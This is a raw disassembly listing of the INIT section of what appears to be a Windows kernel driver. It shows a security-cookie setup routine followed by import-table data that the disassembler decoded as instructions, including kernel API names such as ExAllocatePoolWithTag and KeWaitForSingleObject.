0007fc00 <INIT>:
   7fc00:	add    BYTE PTR [eax],al
   7fc02:	add    BYTE PTR [eax],al
   7fc04:	add    BYTE PTR [ecx+0x7e528],ah
   7fc0a:	mov    ecx,0xbb40e64e
   7fc0f:	test   eax,eax
   7fc11:	je     0x7fc17
   7fc13:	cmp    eax,ecx
   7fc15:	jne    0x7fc31
   7fc17:	mov    eax,ds:0x1ee58
   7fc1c:	mov    eax,DWORD PTR [eax]
   7fc1e:	xor    eax,0x7e528
   7fc23:	mov    ds:0x7e528,eax
   7fc28:	jne    0x7fc31
   7fc2a:	mov    eax,ecx
   7fc2c:	mov    ds:0x7e528,eax
   7fc31:	not    eax
   7fc33:	mov    ds:0x7e52c,eax
   7fc38:	ret    
   7fc39:	mov    bl,0x46
   7fc3b:	jp     0x7fbc3
   7fc3d:	lds    ecx,FWORD PTR [ebx-0x1374aa01]
   7fc43:	call   0x7fc05
   7fc48:	pop    ebp
   7fc49:	jmp    0x19172
   7fc4e:	int3   
   7fc4f:	int3   
   7fc50:	xchg   esp,eax
   7fc51:	cld    
   7fc52:	push   es
	...
   7fc5b:	add    BYTE PTR [eax+0x80006fe],ah
   7fc61:	out    dx,al
   7fc62:	add    BYTE PTR [eax],al
   7fc64:	mov    esp,?
   7fc66:	push   es
	...
   7fc6f:	add    dl,al
   7fc71:	inc    BYTE PTR [esi]
   7fc73:	add    BYTE PTR [eax],al
   7fc75:	out    dx,al
	...
   7fc8a:	add    BYTE PTR [eax],al
   7fc8c:	scas   al,BYTE PTR es:[edi]
   7fc8d:	inc    BYTE PTR [esi]
   7fc8f:	add    BYTE PTR [eax],al
   7fc91:	add    BYTE PTR [eax],al
   7fc93:	add    BYTE PTR [esi],al
   7fc95:	std    
   7fc96:	push   es
   7fc97:	add    BYTE PTR [eax],dl
   7fc99:	std    
   7fc9a:	push   es
   7fc9b:	add    BYTE PTR [edx],bl
   7fc9d:	std    
   7fc9e:	push   es
   7fc9f:	add    BYTE PTR [edi*8-0x2cbfffa],ah
   7fca6:	push   es
   7fca7:	add    BYTE PTR [ebp+edi*8+0x6],dl
   7fcab:	add    BYTE PTR [eax-0x3],ch
   7fcae:	push   es
   7fcaf:	add    BYTE PTR [edx-0x6bfff903],al
   7fcb5:	std    
   7fcb6:	push   es
   7fcb7:	add    BYTE PTR [ebp+edi*8-0x23bfffa],ch
   7fcbe:	push   es
   7fcbf:	add    dl,ch
   7fcc1:	std    
   7fcc2:	push   es
   7fcc3:	add    BYTE PTR [edx],al
   7fcc5:	inc    BYTE PTR [esi]
   7fcc7:	add    BYTE PTR [esi+edi*8],cl
   7fcca:	push   es
   7fccb:	add    BYTE PTR [esi],dl
   7fccd:	inc    BYTE PTR [esi]
   7fccf:	add    BYTE PTR [eax],dh
   7fcd1:	inc    BYTE PTR [esi]
   7fcd3:	add    BYTE PTR [esi-0x2],al
   7fcd6:	push   es
   7fcd7:	add    BYTE PTR [edx-0x2],dl
   7fcda:	push   es
   7fcdb:	add    BYTE PTR [esi-0x2],ah
   7fcde:	push   es
   7fcdf:	add    BYTE PTR [eax-0x2],dh
   7fce2:	push   es
   7fce3:	add    BYTE PTR [edx-0x6ffff902],al
   7fce9:	inc    BYTE PTR [esi]
   7fceb:	add    ah,bh
   7fced:	cld    
   7fcee:	push   es
   7fcef:	add    dh,cl
   7fcf1:	std    
   7fcf2:	push   es
   7fcf3:	add    dl,cl
   7fcf5:	inc    BYTE PTR [esi]
   7fcf7:	add    BYTE PTR [eax],al
   7fcf9:	add    BYTE PTR [eax],al
   7fcfb:	add    BYTE PTR [ebx],cl
   7fcfd:	add    eax,0x6c43775a
   7fd02:	outs   dx,DWORD PTR ds:[esi]
   7fd03:	jae    0x7fd6a
   7fd05:	add    BYTE PTR [ebx+0x5],bh
   7fd08:	pop    edi
   7fd09:	popa   
   7fd0a:	ins    BYTE PTR es:[edi],dx
   7fd0b:	ins    BYTE PTR es:[edi],dx
   7fd0c:	ins    DWORD PTR es:[edi],dx
   7fd0d:	jne    0x7fd7b
   7fd0f:	add    BYTE PTR [ecx+0x5],bh
   7fd12:	pop    edi
   7fd13:	popa   
   7fd14:	ins    BYTE PTR es:[edi],dx
   7fd15:	ins    BYTE PTR es:[edi],dx
   7fd16:	imul   esi,DWORD PTR fs:[esi+0x0],0x615f057d
   7fd1e:	ins    BYTE PTR es:[edi],dx
   7fd1f:	ins    BYTE PTR es:[edi],dx
   7fd20:	jb     0x7fd87
   7fd22:	ins    DWORD PTR es:[edi],dx
   7fd23:	add    BYTE PTR [ebp+0x0],dh
   7fd26:	inc    ebp
   7fd27:	js     0x7fd7b
   7fd29:	popa   
   7fd2a:	imul   esi,DWORD PTR [ebx+0x65],0x74617453
   7fd31:	jne    0x7fda6
   7fd33:	add    BYTE PTR [edx+0x0],al
   7fd36:	inc    ebp
   7fd37:	js     0x7fd7a
   7fd39:	ins    BYTE PTR es:[edi],dx
   7fd3a:	ins    BYTE PTR es:[edi],dx
   7fd3b:	outs   dx,DWORD PTR ds:[esi]
   7fd3c:	arpl   WORD PTR [ecx+0x74],sp
   7fd3f:	gs push eax
   7fd41:	outs   dx,DWORD PTR ds:[esi]
   7fd42:	outs   dx,DWORD PTR ds:[esi]
   7fd43:	ins    BYTE PTR es:[edi],dx
   7fd44:	push   edi
   7fd45:	imul   esi,DWORD PTR [eax+ebp*2+0x54],0x72506761
   7fd4d:	imul   ebp,DWORD PTR [edi+0x72],0x797469
   7fd54:	dec    esi
   7fd55:	add    BYTE PTR [ebp+0x78],al
   7fd58:	inc    esi
   7fd59:	jb     0x7fdc0
   7fd5b:	gs push eax
   7fd5d:	outs   dx,DWORD PTR ds:[esi]
   7fd5e:	outs   dx,DWORD PTR ds:[esi]
   7fd5f:	ins    BYTE PTR es:[edi],dx
   7fd60:	push   edi
   7fd61:	imul   esi,DWORD PTR [eax+ebp*2+0x54],0xbd006761
   7fd69:	add    edx,DWORD PTR [edx+0x74]
   7fd6c:	ins    BYTE PTR es:[edi],dx
   7fd6d:	inc    ebx
   7fd6e:	outs   dx,DWORD PTR ds:[esi]
   7fd6f:	ins    DWORD PTR es:[edi],dx
   7fd70:	jo     0x7fdd3
   7fd72:	jb     0x7fdd9
   7fd74:	push   ebp
   7fd75:	outs   dx,BYTE PTR ds:[esi]
   7fd76:	imul   esp,DWORD PTR [ebx+0x6f],0x74536564
   7fd7d:	jb     0x7fde8
   7fd7f:	outs   dx,BYTE PTR ds:[esi]
   7fd80:	add    BYTE PTR [bp+si+0x2],al
   7fd84:	dec    ebx
   7fd85:	gs push edx
   7fd87:	gs ins BYTE PTR es:[edi],dx
   7fd89:	gs popa 
   7fd8b:	jae    0x7fdf2
   7fd8d:	dec    ebp
   7fd8e:	jne    0x7fe04
   7fd90:	gs js  0x7fd93
   7fd93:	add    BYTE PTR [ebp+0x2],ch
   7fd96:	dec    ebx
   7fd97:	gs push edi
   7fd99:	popa   
   7fd9a:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
   7fda2:	ins    BYTE PTR es:[di],dx
   7fda4:	gs dec edi
   7fda6:	bound  ebp,QWORD PTR [edx+0x65]
   7fda9:	arpl   WORD PTR [eax+eax*1+0x41],si
   7fdad:	add    BYTE PTR [ebp+0x78],al
   7fdb0:	inc    ecx
   7fdb1:	ins    BYTE PTR es:[edi],dx
   7fdb2:	ins    BYTE PTR es:[edi],dx
   7fdb3:	outs   dx,DWORD PTR ds:[esi]
   7fdb4:	arpl   WORD PTR [ecx+0x74],sp
   7fdb7:	gs push eax
   7fdb9:	outs   dx,DWORD PTR ds:[esi]
   7fdba:	outs   dx,DWORD PTR ds:[esi]
   7fdbb:	ins    BYTE PTR es:[edi],dx
   7fdbc:	push   edi
   7fdbd:	imul   esi,DWORD PTR [eax+ebp*2+0x54],0xa7006761
   7fdc5:	add    eax,0x636d656d
   7fdca:	jo     0x7fe45
   7fdcc:	add    BYTE PTR [eax],al
   7fdce:	mov    eax,ds:0x476d4d02
   7fdd3:	gs je  0x7fe29
   7fdd6:	jns    0x7fe4b
   7fdd8:	je     0x7fe3f
   7fdda:	ins    DWORD PTR es:[edi],dx
   7fddb:	push   edx
   7fddc:	outs   dx,DWORD PTR ds:[esi]
   7fddd:	jne    0x7fe53
   7fddf:	imul   ebp,DWORD PTR [esi+0x65],0x72646441
   7fde6:	gs jae 0x7fe5c
   7fde9:	add    bh,al
   7fdeb:	add    edx,DWORD PTR [edx+0x74]
   7fdee:	ins    BYTE PTR es:[edi],dx
   7fdef:	inc    ebx
   7fdf0:	outs   dx,DWORD PTR ds:[esi]
   7fdf1:	jo     0x7fe6c
   7fdf3:	push   ebp
   7fdf4:	outs   dx,BYTE PTR ds:[esi]
   7fdf5:	imul   esp,DWORD PTR [ebx+0x6f],0x74536564
   7fdfc:	jb     0x7fe67
   7fdfe:	outs   dx,BYTE PTR ds:[esi]
   7fdff:	add    BYTE PTR [bx+si],al
   7fe02:	mov    DWORD PTR ds:0x6e736377,0x746163
   7fe0c:	test   eax,0x6d656d05
   7fe11:	jae    0x7fe78
   7fe13:	je     0x7fe15
   7fe15:	add    BYTE PTR [esi],al
   7fe17:	add    eax,0x6c41775a
   7fe1c:	ins    BYTE PTR es:[edi],dx
   7fe1d:	outs   dx,DWORD PTR ds:[esi]
   7fe1e:	arpl   WORD PTR [ecx+0x74],sp
   7fe21:	gs push esi
   7fe23:	imul   esi,DWORD PTR [edx+0x74],0x4d6c6175
   7fe2a:	gs ins DWORD PTR es:[edi],dx
   7fe2c:	outs   dx,DWORD PTR ds:[esi]
   7fe2d:	jb     0x7fea8
   7fe2f:	add    bl,ah
   7fe31:	add    DWORD PTR [ecx+0x6f],ecx
   7fe34:	inc    bx
   7fe36:	outs   dx,DWORD PTR ds:[esi]
   7fe37:	ins    DWORD PTR es:[edi],dx
   7fe38:	jo     0x7fea6
   7fe3a:	gs je  0x7fea2
   7fe3d:	push   edx
   7fe3e:	gs jno 0x7feb6
   7fe41:	gs jae 0x7feb8
   7fe44:	add    BYTE PTR [eax],al
   7fe46:	mov    ecx,0x70777305
   7fe4b:	jb     0x7feb6
   7fe4d:	outs   dx,BYTE PTR ds:[esi]
   7fe4e:	je     0x7feb6
   7fe50:	add    BYTE PTR [eax],al
   7fe52:	xor    eax,DWORD PTR [edx]
   7fe54:	dec    ebx
   7fe55:	gs push ecx
   7fe57:	jne    0x7febe
   7fe59:	jb     0x7fed4
   7fe5b:	push   ebx
   7fe5c:	jns    0x7fed1
   7fe5e:	je     0x7fec5
   7fe60:	ins    DWORD PTR es:[edi],dx
   7fe61:	push   esp
   7fe62:	imul   ebp,DWORD PTR [ebp+0x65],0x7305ac00
   7fe69:	jo     0x7fedd
   7fe6b:	imul   ebp,DWORD PTR [esi+0x74],0x5130066
   7fe72:	pop    edx
   7fe73:	ja     0x7feb8
   7fe75:	jb     0x7fedc
   7fe77:	popa   
   7fe78:	je     0x7fedf
   7fe7a:	push   ebx
   7fe7b:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
   7fe80:	outs   dx,BYTE PTR ds:[esi]
   7fe81:	add    BYTE PTR [esi+0x2],ah
   7fe84:	dec    ebx
   7fe85:	gs push esp
   7fe87:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
   7fe8e:	je     0x7fe90
   7fe90:	test   BYTE PTR [ecx],0x4b
   7fe93:	gs inc edx
   7fe95:	jne    0x7fefe
   7fe97:	inc    ebx
   7fe98:	push   0x456b6365
   7fe9d:	js     0x7fe9f
   7fe9f:	add    BYTE PTR [esi+0x74],ch
   7fea2:	outs   dx,DWORD PTR ds:[esi]
   7fea3:	jae    0x7ff10
   7fea5:	jb     0x7ff15
   7fea7:	ins    BYTE PTR es:[edi],dx
   7fea8:	cs gs js 0x7ff11
   7feac:	add    BYTE PTR [eax],al
   7feae:	inc    eax
   7feaf:	add    BYTE PTR [ebx+0x65],cl
   7feb2:	inc    edi
   7feb3:	gs je  0x7fef9
   7feb6:	jne    0x7ff2a
   7feb8:	jb     0x7ff1f
   7feba:	outs   dx,BYTE PTR ds:[esi]
   7febb:	je     0x7ff06
   7febd:	jb     0x7ff30
   7febf:	ins    BYTE PTR es:[edi],dx
   7fec0:	add    BYTE PTR [eax],al
   7fec2:	dec    eax
   7fec3:	inc    ecx
   7fec4:	dec    esp
   7fec5:	cs fs ins BYTE PTR es:[edi],dx
   7fec8:	ins    BYTE PTR es:[edi],dx
   7fec9:	add    BYTE PTR [eax+0x6c745204],ah
   7fecf:	push   ebp
   7fed0:	outs   dx,BYTE PTR ds:[esi]
   7fed1:	ja     0x7ff3c
   7fed3:	outs   dx,BYTE PTR ds:[esi]
   7fed4:	fs
	...
